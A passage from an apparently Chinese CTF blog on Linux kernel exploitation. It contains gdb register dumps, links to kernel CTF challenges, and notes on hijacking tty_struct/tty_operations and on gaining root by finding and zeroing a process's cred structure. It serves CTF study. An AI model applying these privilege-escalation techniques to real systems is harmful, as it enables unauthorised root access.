class="line"><span class="comment">R14: 0x0 </span></span><br><span class="line"><span class="comment">R15: 0x0</span></span><br><span class="line"><span class="comment">EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span></span><br><span class="line"><span class="comment">[-------------------------------------code-------------------------------------]</span></span><br><span class="line"><span class="comment">   0xffffffff811a37c9:	mov    edx,0x88</span></span><br><span class="line"><span class="comment">   0xffffffff811a37ce:	mov    esi,0x15080c0</span></span><br><span class="line"><span class="comment">   0xffffffff811a37d3:	mov    r13d,DWORD PTR [rip+0x10bf026]        # 0xffffffff82262800</span></span><br><span class="line"><span class="comment">=&gt; 0xffffffff811a37da:	call   0xffffffff81188870</span></span><br><span class="line"><span class="comment">   0xffffffff811a37df:	test   rax,rax</span></span><br><span class="line"><span class="comment">   0xffffffff811a37e2:	je     0xffffffff811a3910</span></span><br><span class="line"><span class="comment">   0xffffffff811a37e8:	cmp    r13d,0xffff</span></span><br><span class="line"><span class="comment">   0xffffffff811a37ef:	mov    rbx,rax</span></span><br><span class="line"><span class="comment">Guessed arguments:</span></span><br><span class="line"><span class="comment">arg[0]: 0xffff88007cc01800 --&gt; 0x23b20 </span></span><br><span class="line"><span class="comment">arg[1]: 0x15080c0 </span></span><br><span class="line"><span class="comment">arg[2]: 0x88 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">RAX: 0x0 </span></span><br><span class="line"><span class="comment">RBX: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RCX: 0x0 </span></span><br><span class="line"><span class="comment">RDX: 0x0 </span></span><br><span class="line"><span class="comment">RSI: 0x15080c0 </span></span><br><span class="line"><span class="comment">RDI: 0x280 </span></span><br><span class="line"><span class="comment">RBP: 0x10 </span></span><br><span class="line"><span class="comment">RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RIP: 0xffffffff811a3851 --&gt; 0xc08548fffe54aae8 </span></span><br><span class="line"><span class="comment">R8 : 0xffff88007f623b20 --&gt; 0xffff88007b3c8840 --&gt; 0xffff88007b3c8900 --&gt; 0xffff88007b3c89c0 --&gt; 0xffff88007b3c8a80 --&gt; 0xffff88007b3c8b40 (--&gt; ...)</span></span><br><span class="line"><span class="comment">R9 : 0x0 </span></span><br><span class="line"><span class="comment">R10: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">R11: 0x0 </span></span><br><span class="line"><span class="comment">R12: 0xffff88007c598c00 --&gt; 0xcb000000ce </span></span><br><span class="line"><span class="comment">R13: 0x10 </span></span><br><span class="line"><span class="comment">R14: 0x0 </span></span><br><span class="line"><span class="comment">R15: 0x0</span></span><br><span class="line"><span class="comment">EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span></span><br><span class="line"><span class="comment">[-------------------------------------code-------------------------------------]</span></span><br><span class="line"><span class="comment">   0xffffffff811a3843:	lea    rdi,[r13+r13*4+0x0]</span></span><br><span class="line"><span class="comment">   0xffffffff811a3848:	mov    esi,0x15080c0</span></span><br><span class="line"><span class="comment">   0xffffffff811a384d:	shl    rdi,0x3</span></span><br><span class="line"><span class="comment">=&gt; 0xffffffff811a3851:	call   0xffffffff81188d00</span></span><br><span class="line"><span class="comment">   0xffffffff811a3856:	test   rax,rax</span></span><br><span class="line"><span class="comment">   0xffffffff811a3859:	mov    QWORD PTR [rbx+0x78],rax</span></span><br><span class="line"><span class="comment">   0xffffffff811a385d:	je     0xffffffff811a38fe</span></span><br><span class="line"><span class="comment">   0xffffffff811a3863:	lea    rdi,[rbx+0x20]</span></span><br><span class="line"><span class="comment">Guessed arguments:</span></span><br><span class="line"><span class="comment">arg[0]: 0x280 </span></span><br><span class="line"><span class="comment">arg[1]: 0x15080c0 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">RAX: 0xffff88007ace8c00 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RBX: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RCX: 0x0 </span></span><br><span class="line"><span class="comment">RDX: 0xffffffff828e9558 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RSI: 0xffffffff81ff2684 ("&amp;pipe-&gt;wait")</span></span><br><span class="line"><span class="comment">RDI: 0xffff88007b3c87a0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RBP: 0x10 </span></span><br><span class="line"><span class="comment">RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RIP: 0xffffffff811a3875 --&gt; 0x1b848ffeeb5e6e8 </span></span><br><span class="line"><span class="comment">R8 : 0xffff88007f623b80 --&gt; 0xffff88007ace9400 --&gt; 0xffff88007ace9800 --&gt; 0xffff88007ace9c00 --&gt; 0xffff88007acea000 --&gt; 0xffff88007acea400 (--&gt; ...)</span></span><br><span class="line"><span class="comment">R9 : 0x0 </span></span><br><span class="line"><span class="comment">R10: 0xffff88007ace8c00 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">R11: 0x0 </span></span><br><span class="line"><span class="comment">R12: 0xffff88007c598c00 --&gt; 0xcb000000ce </span></span><br><span class="line"><span class="comment">R13: 0x10 </span></span><br><span class="line"><span class="comment">R14: 0x0 </span></span><br><span class="line"><span class="comment">R15: 0x0</span></span><br><span class="line"><span class="comment">EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span></span><br><span class="line"><span class="comment">[-------------------------------------code-------------------------------------]</span></span><br><span class="line"><span class="comment">   0xffffffff811a3863:	lea    rdi,[rbx+0x20]</span></span><br><span class="line"><span class="comment">   0xffffffff811a3867:	mov    rdx,0xffffffff828e9558</span></span><br><span class="line"><span class="comment">   0xffffffff811a386e:	mov    rsi,0xffffffff81ff2684</span></span><br><span class="line"><span class="comment">=&gt; 0xffffffff811a3875:	call   0xffffffff8108ee60</span></span><br><span class="line"><span class="comment">   0xffffffff811a387a:	movabs rax,0x100000001</span></span><br><span class="line"><span class="comment">   0xffffffff811a3884:	mov    DWORD PTR [rbx+0x40],r13d</span></span><br><span class="line"><span class="comment">   0xffffffff811a3888:	mov    QWORD PTR [rbx+0x80],r12</span></span><br><span class="line"><span class="comment">   0xffffffff811a388f:	mov    QWORD PTR [rbx+0x54],rax</span></span><br><span class="line"><span class="comment">Guessed arguments:</span></span><br><span class="line"><span class="comment">arg[0]: 0xffff88007b3c87a0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">arg[1]: 0xffffffff81ff2684 ("&amp;pipe-&gt;wait")</span></span><br><span class="line"><span class="comment">arg[2]: 0xffffffff828e9558 --&gt; 0x0 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">RAX: 0x100000001 </span></span><br><span class="line"><span class="comment">RBX: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RCX: 0x0 </span></span><br><span class="line"><span class="comment">RDX: 0xffffffff828e9558 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RSI: 0xffffffff81ff2690 ("&amp;pipe-&gt;mutex")</span></span><br><span class="line"><span class="comment">RDI: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RBP: 0x10 </span></span><br><span class="line"><span class="comment">RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RIP: 0xffffffff811a38a4 --&gt; 0xd88948ffeef9b7e8 </span></span><br><span class="line"><span class="comment">R8 : 0xffff88007f623b80 --&gt; 0xffff88007ace9400 --&gt; 0xffff88007ace9800 --&gt; 0xffff88007ace9c00 --&gt; 0xffff88007acea000 --&gt; 0xffff88007acea400 (--&gt; ...)</span></span><br><span class="line"><span class="comment">R9 : 0x0 </span></span><br><span class="line"><span class="comment">R10: 0xffff88007ace8c00 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">R11: 0x0 </span></span><br><span class="line"><span class="comment">R12: 0xffff88007c598c00 --&gt; 0xcb000000ce </span></span><br><span class="line"><span class="comment">R13: 0x10 </span></span><br><span class="line"><span class="comment">R14: 0x0 </span></span><br><span class="line"><span class="comment">R15: 0x0</span></span><br><span class="line"><span class="comment">EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span></span><br><span class="line"><span class="comment">[-------------------------------------code-------------------------------------]</span></span><br><span class="line"><span class="comment">   0xffffffff811a3893:	mov    rdi,rbx</span></span><br><span class="line"><span class="comment">   0xffffffff811a3896:	mov    rdx,0xffffffff828e9558</span></span><br><span class="line"><span class="comment">   0xffffffff811a389d:	mov    rsi,0xffffffff81ff2690</span></span><br><span class="line"><span class="comment">=&gt; 0xffffffff811a38a4:	call   0xffffffff81093260</span></span><br><span class="line"><span class="comment">   0xffffffff811a38a9:	mov    rax,rbx</span></span><br><span class="line"><span class="comment">   0xffffffff811a38ac:	pop    rbx</span></span><br><span class="line"><span class="comment">   0xffffffff811a38ad:	pop    rbp</span></span><br><span class="line"><span class="comment">   0xffffffff811a38ae:	pop    r12</span></span><br><span class="line"><span class="comment">Guessed arguments:</span></span><br><span class="line"><span class="comment">arg[0]: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">arg[1]: 0xffffffff81ff2690 ("&amp;pipe-&gt;mutex")</span></span><br><span class="line"><span class="comment">arg[2]: 0xffffffff828e9558 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h1 id="2019D-3CTF-Knote-V2"><a href="#2019D-3CTF-Knote-V2" class="headerlink" title="2019D^3CTF_Knote_V2"></a>2019D^3CTF_Knote_V2</h1><p><a href="https://github.com/BrieflyX/ctf-pwns/tree/master/kernel/knoteV2" target="_blank" rel="noopener">https://github.com/BrieflyX/ctf-pwns/tree/master/kernel/knoteV2</a></p>
<h1 id="2019TWCTF-Gnote"><a href="#2019TWCTF-Gnote" class="headerlink" title="2019TWCTF_Gnote"></a>2019TWCTF_Gnote</h1><p><a href="https://github.com/BrieflyX/ctf-pwns/tree/master/kernel/gnote" target="_blank" rel="noopener">https://github.com/BrieflyX/ctf-pwns/tree/master/kernel/gnote</a></p>
<p># </p>
<h1 id="待续。。。"><a href="#待续。。。" class="headerlink" title="待续。。。"></a>待续。。。</h1><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="tyy-struct-amp-amp-tty-operations："><a href="#tyy-struct-amp-amp-tty-operations：" class="headerlink" title="tyy_struct &amp;&amp; tty_operations："></a>tyy_struct &amp;&amp; tty_operations：</h2><p>若是可以<strong>伪造/控制/修改</strong>一个<code>ptmx</code>设备文件的<code>tty_struct</code>结构体则可以通过对此设备文件进行操作以控制执行流。目前只见过<code>UAF</code>和<code>堆溢出</code>中的应用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic; <span class="comment">//4                     </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span> <span class="comment">//4                 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span> <span class="comment">//8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span> <span class="comment">//8</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span>     <span class="comment">//tty_operations结构体 offser=24 </span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,  <span class="comment">//7</span></span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,   <span class="comment">//12</span></span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout; <span class="comment">//256bytes 32个函数指针 open:3 write:7 close:4 ioctl:12</span></span><br></pre></td></tr></table></figure>
<p><code>tty_struct[0] = 0x100005401</code>，<code>tty_struct[3] = 内核基址</code>，<code>tty_struct[7] = 内核堆地址</code></p>
<p><code>tty_operation</code>一般劫持<code>write</code>函数较为简便，此时<code>rax</code>正好指向<code>tty_operation</code>的基地址。</p>
<h2 id="cred-amp-amp-task-struct-amp-amp-thread-info-amp-amp-内核stack："><a href="#cred-amp-amp-task-struct-amp-amp-thread-info-amp-amp-内核stack：" class="headerlink" title="cred &amp;&amp; task_struct &amp;&amp; thread_info &amp;&amp; 内核stack："></a>cred &amp;&amp; task_struct &amp;&amp; thread_info &amp;&amp; 内核stack：</h2><p>每个进程有一个<code>task_struct</code>，这个结构体中记录了进程的信息，被称为进程描述符。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cred        --&gt; cred结构体位置</span><br><span class="line">real_cred   --&gt; cred结构体位置</span><br><span class="line">comm[]      --&gt; 进程的名字</span><br></pre></td></tr></table></figure>
<p>可以用<code>prctl(PR_SET_NAME,name)</code>定制<code>comm[]</code>，需要<code>strlen(name)&lt;=15</code>，然后通过内存匹配搜寻内核中<code>comm[]</code>位置，用<code>if(cred == real_cred)</code>来过滤，找到<code>cred</code>地址后，改前<code>28</code>个字节全为0即可提权。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span>    <span class="comment">//8个1000可作为过滤器</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* 